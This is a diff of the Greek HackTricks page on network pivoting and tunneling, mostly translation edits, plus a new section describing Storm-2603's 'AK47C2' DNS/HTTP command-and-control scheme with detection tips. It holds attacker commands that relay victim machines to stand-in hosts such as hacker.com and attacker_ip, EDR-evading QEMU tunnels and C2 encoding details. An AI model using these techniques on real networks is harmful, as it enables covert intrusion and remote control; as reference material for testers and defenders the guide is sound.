@@ -89,7 +89,7 @@ route add -net 10.0.0.0/16 gw 1.1.1.1
 ```
 > [!NOTE]
 > **Ασφάλεια – Επίθεση Terrapin (CVE-2023-48795)**
-> Η επίθεση υποβάθμισης Terrapin του 2023 μπορεί να επιτρέψει σε έναν επιτιθέμενο man-in-the-middle να παραποιήσει την πρώιμη διαδικασία handshake του SSH και να εισάγει δεδομένα σε **οποιοδήποτε προωθημένο κανάλι** ( `-L`, `-R`, `-D` ). Βεβαιωθείτε ότι τόσο ο πελάτης όσο και ο διακομιστής είναι ενημερωμένοι (**OpenSSH ≥ 9.6/LibreSSH 6.7**) ή απενεργοποιήστε ρητά τους ευάλωτους αλγόριθμους `chacha20-poly1305@openssh.com` και `*-etm@openssh.com` στο `sshd_config`/`ssh_config` πριν βασιστείτε σε SSH tunnels.
+> Η επίθεση υποβάθμισης Terrapin του 2023 μπορεί να επιτρέψει σε έναν επιτιθέμενο man-in-the-middle να παραποιήσει το αρχικό handshake SSH και να εισάγει δεδομένα σε **οποιοδήποτε προωθημένο κανάλι** ( `-L`, `-R`, `-D` ). Βεβαιωθείτε ότι τόσο ο πελάτης όσο και ο διακομιστής είναι ενημερωμένοι (**OpenSSH ≥ 9.6/LibreSSH 6.7**) ή απενεργοποιήστε ρητά τους ευάλωτους αλγόριθμους `chacha20-poly1305@openssh.com` και `*-etm@openssh.com` στο `sshd_config`/`ssh_config` πριν βασιστείτε σε SSH tunnels.
 
 ## SSHUTTLE
 
@@ -156,7 +156,7 @@ rportfwd stop [bind port]
 ```
 Για σημείωση:
 
-- Η αντίστροφη προώθηση θύρας του Beacon έχει σχεδιαστεί για να **συνδέει την κίνηση στον Server Ομάδας, όχι για τη διαμεσολάβηση μεταξύ μεμονωμένων μηχανών**.
+- Η αντίστροφη προώθηση θύρας του Beacon έχει σχεδιαστεί για να **συνδέει την κίνηση στον Server Ομάδας, όχι για αναμετάδοση μεταξύ μεμονωμένων μηχανών**.
 - Η κίνηση είναι **συνδεδεμένη μέσα στην κίνηση C2 του Beacon**, συμπεριλαμβανομένων των P2P συνδέσεων.
 - **Δικαιώματα διαχειριστή δεν απαιτούνται** για τη δημιουργία αντίστροφων προωθήσεων θύρας σε υψηλές θύρες.
 
@@ -223,7 +223,7 @@ interface_add_route --name "ligolo" --route <network_address_agent>/<netmask_age
 # Display the tun interfaces -- Attacker
 interface_list
 ```
-### Σύνδεση και Ακρόαση
+### Σύνδεση και Ακρόαση του Πράκτορα
 ```bash
 # Establish a tunnel from the proxy server to the agent
 # Create a TCP listening socket on the agent (0.0.0.0) on port 30000 and forward incoming TCP connections to the proxy (127.0.0.1) on port 10000 -- Attacker
@@ -290,7 +290,7 @@ attacker> socat OPENSSL-LISTEN:443,cert=server.pem,cafile=client.crt,reuseaddr,f
 victim> socat.exe TCP-LISTEN:2222 OPENSSL,verify=1,cert=client.pem,cafile=server.crt,connect-timeout=5|TCP:hacker.com:443,connect-timeout=5
 #Execute the meterpreter
 ```
-Μπορείτε να παρακάμψετε έναν **μη αυθεντικοποιημένο διακομιστή μεσολάβησης** εκτελώντας αυτή τη γραμμή αντί για την τελευταία στην κονσόλα του θύματος:
+Μπορείτε να παρακάμψετε έναν **μη αυθεντικοποιημένο διακομιστή μεσολάβησης** εκτελώντας αυτή τη γραμμή αντί για την τελευταία στη κονσόλα του θύματος:
 ```bash
 OPENSSL,verify=1,cert=client.pem,cafile=server.crt,connect-timeout=5|PROXY:hacker.com:443,connect-timeout=5|TCP:proxy.lan:8080,connect-timeout=5
 ```
@@ -316,7 +316,7 @@ victim> socat STDIO OPENSSL-CONNECT:localhost:433,cert=client.pem,cafile=server.
 ```
 ### Remote Port2Port
 
-Συνδέστε την τοπική θύρα SSH (22) με την θύρα 443 του επιτιθέμενου.
+Συνδέστε την τοπική θύρα SSH (22) με την θύρα 443 του επιτιθέμενου υπολογιστή
 ```bash
 attacker> sudo socat TCP4-LISTEN:443,reuseaddr,fork TCP4-LISTEN:2222,reuseaddr #Redirect port 2222 to port 443 in localhost
 victim> while true; do socat TCP4:<attacker>:443 TCP4:127.0.0.1:22 ; done # Establish connection with the port 443 of the attacker and everything that comes from here is redirected to port 22
@@ -353,12 +353,12 @@ netsh interface portproxy delete v4tov4 listenaddress=0.0.0.0 listenport=4444
 1. [SocksOverRDP x64 Binaries](https://github.com/nccgroup/SocksOverRDP/releases) - Αυτό το εργαλείο χρησιμοποιεί `Dynamic Virtual Channels` (`DVC`) από τη δυνατότητα Remote Desktop Service των Windows. Το DVC είναι υπεύθυνο για **tunneling πακέτων μέσω της σύνδεσης RDP**.
 2. [Proxifier Portable Binary](https://www.proxifier.com/download/#win-tab)
 
-Στον υπολογιστή-πελάτη σας, φορτώστε **`SocksOverRDP-Plugin.dll`** όπως αυτό:
+Στον υπολογιστή-πελάτη σας φορτώστε **`SocksOverRDP-Plugin.dll`** έτσι:
 ```bash
 # Load SocksOverRDP.dll using regsvr32.exe
 C:\SocksOverRDP-x64> regsvr32.exe SocksOverRDP-Plugin.dll
 ```
-Τώρα μπορούμε να **συνδεθούμε** με το **θύμα** μέσω **RDP** χρησιμοποιώντας **`mstsc.exe`**, και θα πρέπει να λάβουμε μια **προτροπή** που λέει ότι το **SocksOverRDP plugin είναι ενεργοποιημένο**, και θα **ακούει** στη διεύθυνση **127.0.0.1:1080**.
+Τώρα μπορούμε να **συνδεθούμε** με το **θύμα** μέσω **RDP** χρησιμοποιώντας **`mstsc.exe`**, και θα πρέπει να λάβουμε μια **ειδοποίηση** που λέει ότι το **SocksOverRDP plugin είναι ενεργοποιημένο**, και θα **ακούει** στη διεύθυνση **127.0.0.1:1080**.
 
 **Συνδεθείτε** μέσω **RDP** και ανεβάστε & εκτελέστε στο μηχάνημα του θύματος το δυαδικό αρχείο `SocksOverRDP-Server.exe`:
 ```
@@ -368,13 +368,13 @@ C:\SocksOverRDP-x64> SocksOverRDP-Server.exe
 ```
 netstat -antb | findstr 1080
 ```
-Τώρα μπορείτε να χρησιμοποιήσετε [**Proxifier**](https://www.proxifier.com/) **για να προξενήσετε την κίνηση μέσω αυτού του πόρου.**
+Τώρα μπορείτε να χρησιμοποιήσετε [**Proxifier**](https://www.proxifier.com/) **για να προξενήσετε την κίνηση μέσω αυτού του θύρας.**
 
-## Προξενήστε εφαρμογές Windows GUI
+## Προξενήστε Εφαρμογές Windows GUI
 
 Μπορείτε να κάνετε τις εφαρμογές Windows GUI να περιηγούνται μέσω ενός proxy χρησιμοποιώντας [**Proxifier**](https://www.proxifier.com/).\
-Στο **Profile -> Proxy Servers** προσθέστε τη διεύθυνση IP και τον πόρο του διακομιστή SOCKS.\
-Στο **Profile -> Proxification Rules** προσθέστε το όνομα του προγράμματος που θέλετε να προξενήσετε και τις συνδέσεις προς τις διευθύνσεις IP που θέλετε να προξενήσετε.
+Στο **Profile -> Proxy Servers** προσθέστε τη διεύθυνση IP και τη θύρα του διακομιστή SOCKS.\
+Στο **Profile -> Proxification Rules** προσθέστε το όνομα του προγράμματος που θέλετε να προξενήσετε και τις συνδέσεις στις διευθύνσεις IP που θέλετε να προξενήσετε.
 
 ## Παράκαμψη proxy NTLM
 
@@ -396,8 +396,8 @@ Domain CONTOSO.COM
 Proxy 10.0.0.10:8080
 Tunnel 2222:<attackers_machine>:443
 ```
-Τώρα, αν ρυθμίσετε για παράδειγμα στον θύμα την υπηρεσία **SSH** να ακούει στην πόρτα 443. Μπορείτε να συνδεθείτε σε αυτήν μέσω της θύρας 2222 του επιτιθέμενου.\
-Μπορείτε επίσης να χρησιμοποιήσετε ένα **meterpreter** που συνδέεται στο localhost:443 και ο επιτιθέμενος ακούει στην πόρτα 2222.
+Τώρα, αν ρυθμίσετε για παράδειγμα στην θυματική μηχανή την υπηρεσία **SSH** να ακούει στην θύρα 443. Μπορείτε να συνδεθείτε σε αυτήν μέσω της θύρας 2222 του επιτιθέμενου.\
+Μπορείτε επίσης να χρησιμοποιήσετε ένα **meterpreter** που συνδέεται στο localhost:443 και ο επιτιθέμενος ακούει στην θύρα 2222.
 
 ## YARP
 
@@ -452,6 +452,40 @@ listen [lhost:]lport rhost:rport #Ex: listen 127.0.0.1:8080 10.0.0.20:80, this b
 
 [https://github.com/hotnops/gtunnel](https://github.com/hotnops/gtunnel)
 
+### Προσαρμοσμένο DNS TXT / HTTP JSON C2 (AK47C2)
+
+Ο ηθοποιός Storm-2603 δημιούργησε ένα **dual-channel C2 ("AK47C2")** που εκμεταλλεύεται *μόνο* την εξερχόμενη **DNS** και την **καθαρή HTTP POST** κίνηση – δύο πρωτόκολλα που σπάνια μπλοκάρονται σε εταιρικά δίκτυα.
+
+1. **Λειτουργία DNS (AK47DNS)**
+• Δημιουργεί ένα τυχαίο SessionID 5 χαρακτήρων (π.χ. `H4T14`).
+• Προσθέτει `1` για *αιτήματα εργασίας* ή `2` για *αποτελέσματα* και συνενώνει διάφορα πεδία (flags, SessionID, όνομα υπολογιστή).
+• Κάθε πεδίο είναι **XOR-κρυπτογραφημένο με το ASCII κλειδί `VHBD@H`**, κωδικοποιημένο σε hex, και κολλημένο μαζί με τελείες – τελικά καταλήγοντας με το domain που ελέγχει ο επιτιθέμενος:
+
+```text
+<1|2><SessionID>.a<SessionID>.<Computer>.update.updatemicfosoft.com
+```
+
+• Τα αιτήματα χρησιμοποιούν `DnsQuery()` για **TXT** (και εφεδρικά **MG**) αρχεία.
+• Όταν η απάντηση υπερβαίνει τα 0xFF bytes, η backdoor **σπάει** τα δεδομένα σε κομμάτια 63 bytes και εισάγει τους δείκτες:
+`s<SessionID>t<TOTAL>p<POS>` ώστε ο διακομιστής C2 να μπορεί να τα αναδιατάξει.
+
+2. **Λειτουργία HTTP (AK47HTTP)**
+• Δημιουργεί ένα JSON φάκελο:
+```json
+{"cmd":"","cmd_id":"","fqdn":"<host>","result":"","type":"task"}
+```
+• Ολόκληρο το blob είναι XOR-`VHBD@H` → hex → αποστέλλεται ως το σώμα ενός **`POST /`** με κεφαλίδα `Content-Type: text/plain`.
+• Η απάντηση ακολουθεί την ίδια κωδικοποίηση και το πεδίο `cmd` εκτελείται με `cmd.exe /c <command> 2>&1`.
+
+Σημειώσεις Blue Team
+• Αναζητήστε ασυνήθιστα **TXT queries** των οποίων η πρώτη ετικέτα είναι μακρύς δεκαεξαδικός και πάντα τελειώνει σε ένα σπάνιο domain.
+• Ένα σταθερό XOR κλειδί ακολουθούμενο από ASCII-hex είναι εύκολο να ανιχνευθεί με YARA: `6?56484244?484` (`VHBD@H` σε hex).
+• Για HTTP, σημειώστε τα σώματα POST τύπου text/plain που είναι καθαρός hex και πολλαπλάσια του δύο bytes.
+
+{{#note}}
+Ολόκληρο το κανάλι χωράει μέσα σε **τυπικά RFC-compliant queries** και διατηρεί κάθε ετικέτα υποτομέα κάτω από 63 bytes, καθιστώντας το κρυφό στα περισσότερα DNS logs.
+{{#endnote}}
+
 ## ICMP Tunneling
 
 ### Hans
@@ -459,7 +493,7 @@ listen [lhost:]lport rhost:rport #Ex: listen 127.0.0.1:8080 10.0.0.20:80, this b
 [https://github.com/friedrich/hans](https://github.com/friedrich/hans)\
 [https://github.com/albertzak/hanstunnel](https://github.com/albertzak/hanstunnel)
 
-Απαιτείται δικαιώματα root και στα δύο συστήματα για να δημιουργηθούν οι προσαρμογείς tun και να μεταφερθούν δεδομένα μεταξύ τους χρησιμοποιώντας αιτήματα ICMP echo.
+Απαιτείται root και στα δύο συστήματα για να δημιουργηθούν tun adapters και να μεταφερθούν δεδομένα μεταξύ τους χρησιμοποιώντας αιτήματα ICMP echo.
 ```bash
 ./hans -v -f -s 1.1.1.1 -p P@ssw0rd #Start listening (1.1.1.1 is IP of the new vpn connection)
 ./hans -f -c <server_ip> -p P@ssw0rd -v
@@ -502,7 +536,7 @@ chmod a+x ./ngrok
 
 _Είναι επίσης δυνατή η προσθήκη αυθεντικοποίησης και TLS, αν είναι απαραίτητο._
 
-#### Tunneling TCP
+#### Τούνελινγκ TCP
 ```bash
 # Pointing to 0.0.0.0:4444
 ./ngrok tcp 4444
@@ -518,7 +552,7 @@ _Είναι επίσης δυνατή η προσθήκη αυθεντικοπο
 #### Sniffing HTTP calls
 
 _Χρήσιμο για XSS, SSRF, SSTI ..._\
-Άμεσα από το stdout ή στη διεπαφή HTTP [http://127.0.0.1:4040](http://127.0.0.1:4000).
+Απευθείας από το stdout ή στη διεπαφή HTTP [http://127.0.0.1:4040](http://127.0.0.1:4000).
 
 #### Tunneling internal HTTP service
 ```bash
@@ -574,7 +608,7 @@ url: http://127.0.0.1:8000
 ```bash
 cloudflared tunnel run mytunnel
 ```
-Επειδή όλη η κίνηση φεύγει από τον υπολογιστή **outbound over 443**, οι σήραγγες Cloudflared είναι ένας απλός τρόπος για να παρακάμψετε τα ingress ACLs ή τα NAT boundaries. Να είστε προσεκτικοί ότι το δυαδικό αρχείο συνήθως εκτελείται με αυξημένα δικαιώματα – χρησιμοποιήστε κοντέινερ ή την επιλογή `--user` όταν είναι δυνατόν.
+Γιατί όλη η κίνηση φεύγει από τον υπολογιστή **outbound over 443**, οι σήραγγες Cloudflared είναι ένας απλός τρόπος για να παρακαμφθούν οι ACL εισόδου ή τα όρια NAT. Να είστε προσεκτικοί ότι το δυαδικό αρχείο συνήθως εκτελείται με αυξημένα δικαιώματα – χρησιμοποιήστε κοντέινερ ή την επιλογή `--user` όταν είναι δυνατόν.
 
 ## FRP (Fast Reverse Proxy)
 
@@ -608,11 +642,11 @@ sshTunnelGateway.bindPort = 2200   # add to frps.toml
 # On victim (OpenSSH client only)
 ssh -R :80:127.0.0.1:8080 v0@attacker_ip -p 2200 tcp --proxy_name web --remote_port 9000
 ```
-Η παραπάνω εντολή δημοσιεύει την θύρα του θύματος **8080** ως **attacker_ip:9000** χωρίς να αναπτύσσει επιπλέον εργαλεία – ιδανικό για pivoting που βασίζεται σε υπάρχοντα εργαλεία.
+Η παραπάνω εντολή δημοσιεύει την θύρα του θύματος **8080** ως **attacker_ip:9000** χωρίς να αναπτύσσει επιπλέον εργαλεία – ιδανικό για living-off-the-land pivoting.
 
 ## Κρυφά VM-based Tunnels με QEMU
 
-Η δικτύωση χρήστη του QEMU (`-netdev user`) υποστηρίζει μια επιλογή που ονομάζεται `hostfwd` που **δεσμεύει μια θύρα TCP/UDP στον *host* και την προωθεί στον *guest***. Όταν ο guest εκτελεί έναν πλήρη SSH daemon, ο κανόνας hostfwd σας δίνει ένα αναλώσιμο SSH jump box που ζει εξ ολοκλήρου μέσα σε μια επαφή VM – τέλειο για να κρύβει την κίνηση C2 από το EDR επειδή όλες οι κακόβουλες δραστηριότητες και τα αρχεία παραμένουν στον εικονικό δίσκο.
+Η δικτύωση χρήστη του QEMU (`-netdev user`) υποστηρίζει μια επιλογή που ονομάζεται `hostfwd` που **δεσμεύει μια θύρα TCP/UDP στον *host* και την προωθεί στον *guest***. Όταν ο guest εκτελεί έναν πλήρη SSH daemon, ο κανόνας hostfwd σας δίνει ένα αναλώσιμο SSH jump box που ζει εξ ολοκλήρου μέσα σε μια επαφή VM – τέλειο για να κρύβει την κίνηση C2 από EDR επειδή όλες οι κακόβουλες δραστηριότητες και τα αρχεία παραμένουν στον εικονικό δίσκο.
 
 ### Γρήγορη μία γραμμή
 ```powershell
@@ -653,12 +687,12 @@ while ! ping -c1 45.77.4.101; do sleep 2; done
 ### Why this evades detection
 
 • Μόνο δύο μη υπογεγραμμένα εκτελέσιμα αρχεία (`qemu-system-*.exe`) αγγίζουν τον δίσκο; δεν εγκαθίστανται οδηγοί ή υπηρεσίες.
-• Τα προϊόντα ασφαλείας στον host βλέπουν **καλοήθη loopback traffic** (η πραγματική C2 τερματίζει μέσα στη VM).
-• Οι σαρωτές μνήμης δεν αναλύουν ποτέ τον κακόβουλο χώρο διεργασίας επειδή ζει σε διαφορετικό OS.
+• Τα προϊόντα ασφαλείας στον υπολογιστή βλέπουν **καλοήθη loopback traffic** (η πραγματική C2 τερματίζει μέσα στη VM).
+• Οι σαρωτές μνήμης δεν αναλύουν ποτέ τον κακόβουλο χώρο διεργασίας επειδή ζει σε διαφορετικό λειτουργικό σύστημα.
 
 ### Defender tips
 
-• Ειδοποιήστε για **αναμενόμενα QEMU/VirtualBox/KVM binaries** σε διαδρομές που μπορούν να γραφούν από χρήστες.
+• Ειδοποιήστε για **αναπάντεχα QEMU/VirtualBox/KVM binaries** σε διαδρομές που μπορούν να γραφούν από χρήστες.
 • Εμποδίστε τις εξερχόμενες συνδέσεις που προέρχονται από `qemu-system*.exe`.
 • Κυνηγήστε σπάνιες θύρες ακρόασης (2222, 10022, …) που δεσμεύονται αμέσως μετά από μια εκκίνηση QEMU.
 
@@ -672,5 +706,6 @@ while ! ping -c1 45.77.4.101; do sleep 2; done
 ## References
 
 - [Hiding in the Shadows: Covert Tunnels via QEMU Virtualization](https://trustedsec.com/blog/hiding-in-the-shadows-covert-tunnels-via-qemu-virtualization)
+- [Check Point Research – Before ToolShell: Exploring Storm-2603’s Previous Ransomware Operations](https://research.checkpoint.com/2025/before-toolshell-exploring-storm-2603s-previous-ransomware-operations/)
 
 {{#include ../banners/hacktricks-training.md}}
